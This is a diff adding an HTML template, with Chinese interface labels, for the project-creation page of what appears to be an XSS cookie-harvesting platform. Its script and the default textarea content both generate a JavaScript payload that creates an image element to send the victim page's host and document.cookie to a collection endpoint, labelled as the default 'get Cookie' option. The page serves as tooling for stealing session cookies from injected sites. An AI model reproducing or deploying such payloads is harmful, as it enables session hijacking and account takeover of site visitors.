@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>{{ title }}</title>
+<script>
+function toggleTextarea() {
+    const select = document.getElementById('len');
+    const textarea = document.getElementById('description');
+    if (select.value === '1') {
+        textarea.disabled = false; // 启用 textarea
+    } else {
+        textarea.disabled = true; // 禁用 textarea
+
+    }
+}
+
+function toHex(str) {
+    const encoder = new TextEncoder(); // 使用 UTF-8 编码
+    const encoded = encoder.encode(str); // 返回 Uint8Array
+    let result = '';
+    for (let byte of encoded) {
+        result += byte.toString(16).padStart(2, '0'); // 转为两位 16 进制
+    }
+    return result;
+}
+
+
+window.addEventListener('DOMContentLoaded', (event) => {
+    const input = document.getElementById('dynamicInput');
+    const textarea = document.getElementById('description');
+
+    input.addEventListener('input', function () {
+        const dynamicValue = input.value || '[dynamic_value]'; // 默认占位符
+        const hexValue = toHex(dynamicValue); // 转换为 16 进制
+        textarea.value = `var img=document.createElement("img");
+img.src="host:receive?h="+escape(document.location.host)+"&m="+escape(document.cookie)+"&u=grey"+"&n=${hexValue}";
+document.body.appendChild(img);`;
+    });
+});
+</script>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="{{ url_for('static',filename='css/bootstrap.min.css') }}">
+<link rel="stylesheet" href="{{ url_for('static',filename='css/bootstrap-theme.min.css') }}">
+<link rel="stylesheet" href="{{ url_for('static',filename='css/css.css') }}">
+</head>
+<body>
+<div class="navbar navbar-fixed-top navbar-inverse">
+   <div class="container">
+        <div class="collapse navbar-collapse">
+          <ul class="nav navbar-nav">
+            <li><a href="/home">主页</a></li>
+		  <li class="active"><a href="/config">项目配置</a></li>
+          </ul>
+          <ul class="nav navbar-nav navbar-right ng-scope" ng-controller="user_ctrl" id="header_me">
+        <li>
+        <a href="#" wt-tracker="Header|Menu|Goto Apply" style="font-weight: bold; color: white;">账号 : {{ username }}</a>
+        </li>
+
+
+                <iframe id="tmp_downloadhelper_iframe" style="display: none;"></iframe></li>
+                <li>
+                    <a href="/user" wt-tracker="Header|Menu|Goto Apply">个人设置</a>
+                </li>
+                <li>
+                    <a href="/auth/logout" wt-tracker="Header|Menu|Goto Apply">退出登陆</a>
+                </li>
+            </ul>
+			        </div><!--/.nav-collapse -->
+      <iframe  style="display: none;"></iframe></div>
+    </div>
+
+
+<div class="container">
+<div class="panel panel-default">
+    	<div class="panel-heading">创建项目</div>
+<form style="padding: 10px 15px;" action="/js/create" method="POST">
+<fieldset>
+    <p>
+		<label for="dynamicInput">项目名称：</label><br>
+		<input type="text" id="dynamicInput" name="js_name">
+	</p>
+	<p>
+    <label>JS代码：</label><br>
+    <select name="len" id="len" onchange="toggleTextarea()">
+        <option value="0">默认(获取Cookie)</option>
+        <option value="1">自定义代码</option>
+    </select>
+</p>
+<p>
+    <label for="description">自定义代码：</label><br>
+    <textarea name="description" id="description" style="height: 147px; width: 474px;" disabled>
+var img=document.createElement("img");
+img.src="host:receive?h="+escape(document.location.host)+"&m="+escape(document.cookie)+"&u=grey"+"&n=[dynamic_value]";
+document.body.appendChild(img);
+    </textarea>
+</p>
+<p>
+    <input class="btn btn-success" type="submit" value="创建">
+</p>
+</fieldset>
+</form>
+</div>
+</div>
+</body>
+</html>
